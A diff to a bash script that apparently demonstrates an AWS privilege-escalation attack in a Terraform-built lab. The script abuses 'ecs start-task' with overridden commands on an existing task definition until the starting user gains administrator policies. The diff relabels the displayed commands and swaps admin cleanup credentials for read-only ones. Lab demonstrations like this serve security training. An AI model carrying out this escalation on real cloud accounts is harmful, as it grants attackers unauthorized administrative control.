@@ -24,12 +24,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -74,12 +76,12 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
-# Retrieve admin cleanup credentials
-ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
-ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)
+# Retrieve readonly credentials
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
 
-if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
-    echo -e "${RED}Error: Could not find admin cleanup credentials in terraform output${NC}"
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
     exit 1
 fi
 
@@ -108,9 +110,9 @@ use_starting_user_creds() {
     export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
     unset AWS_SESSION_TOKEN
 }
-use_admin_creds() {
-    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
-    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
     unset AWS_SESSION_TOKEN
 }
 
@@ -122,7 +124,7 @@ export AWS_REGION=$AWS_REGION
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -134,7 +136,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -142,7 +144,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}Warning: Unexpectedly have admin permissions already${NC}"
 else
@@ -152,10 +154,10 @@ echo ""
 
 # [OBSERVATION] Check current policies attached to starting user
 # Step 5: Check for attached policies (should have none or minimal)
-use_admin_creds
+use_readonly_creds
 echo -e "${YELLOW}Step 5: Checking current policies attached to starting user${NC}"
 echo "Listing attached policies for: $STARTING_USER"
-show_cmd "aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].PolicyName' --output text"
+show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].PolicyName' --output text"
 ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].PolicyName' --output text)
 if [ -z "$ATTACHED_POLICIES" ]; then
     echo "No managed policies currently attached"
@@ -168,7 +170,7 @@ echo -e "${GREEN}✓ Verified current policy state${NC}\n"
 # Step 6: Discover the pre-existing task definition
 echo -e "${YELLOW}Step 6: Discovering existing task definitions in the cluster${NC}"
 echo "Listing task definitions with family prefix: $EXISTING_TASK_FAMILY"
-show_cmd "aws ecs list-task-definitions --region $AWS_REGION --family-prefix $EXISTING_TASK_FAMILY --query 'taskDefinitionArns' --output json"
+show_cmd "ReadOnly" "aws ecs list-task-definitions --region $AWS_REGION --family-prefix $EXISTING_TASK_FAMILY --query 'taskDefinitionArns' --output json"
 
 TASK_DEFS=$(aws ecs list-task-definitions \
     --region $AWS_REGION \
@@ -189,7 +191,7 @@ echo -e "${GREEN}✓ Identified existing task definition to exploit${NC}\n"
 # Step 7: Retrieve the container instance ARN
 echo -e "${YELLOW}Step 7: Retrieving container instance ARN from ECS cluster${NC}"
 echo "Cluster: $ECS_CLUSTER_NAME"
-show_cmd "aws ecs list-container-instances --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --query 'containerInstanceArns[0]' --output text"
+show_cmd "ReadOnly" "aws ecs list-container-instances --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --query 'containerInstanceArns[0]' --output text"
 
 CONTAINER_INSTANCE_ARN=$(aws ecs list-container-instances \
     --region $AWS_REGION \
@@ -243,7 +245,7 @@ OVERRIDES=$(cat <<EOF
 EOF
 )
 
-show_attack_cmd "aws ecs start-task --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --task-definition $EXISTING_TASK_FAMILY --container-instances $CONTAINER_INSTANCE_ARN --overrides '$OVERRIDES'"
+show_attack_cmd "Attacker" "aws ecs start-task --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --task-definition $EXISTING_TASK_FAMILY --container-instances $CONTAINER_INSTANCE_ARN --overrides '$OVERRIDES'"
 START_TASK_RESULT=$(aws ecs start-task \
     --region $AWS_REGION \
     --cluster $ECS_CLUSTER_NAME \
@@ -273,7 +275,7 @@ echo -e "${GREEN}✓ Successfully started ECS task with overridden command and r
 
 # [OBSERVATION] Poll task status until completion
 # Step 9: Wait for task to complete
-use_admin_creds
+use_readonly_creds
 echo -e "${YELLOW}Step 9: Waiting for ECS task to complete${NC}"
 echo "Monitoring task status..."
 
@@ -285,7 +287,7 @@ while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
     ATTEMPT=$((ATTEMPT + 1))
 
     # Get task status
-    show_cmd "aws ecs describe-tasks --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --tasks $TASK_ARN --output json"
+    show_cmd "ReadOnly" "aws ecs describe-tasks --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --tasks $TASK_ARN --output json"
     TASK_INFO=$(aws ecs describe-tasks \
         --region $AWS_REGION \
         --cluster $ECS_CLUSTER_NAME \
@@ -337,7 +339,7 @@ echo -e "${GREEN}✓ IAM policy propagation complete${NC}\n"
 echo -e "${YELLOW}Step 11: Verifying policy attachment${NC}"
 echo "Checking attached policies for: $STARTING_USER"
 
-show_cmd "aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' --output text"
+show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' --output text"
 ATTACHED_POLICIES_AFTER=$(aws iam list-attached-user-policies \
     --user-name $STARTING_USER \
     --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \
@@ -361,7 +363,7 @@ echo ""
 # Step 12: Verify admin access
 echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
-show_cmd "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
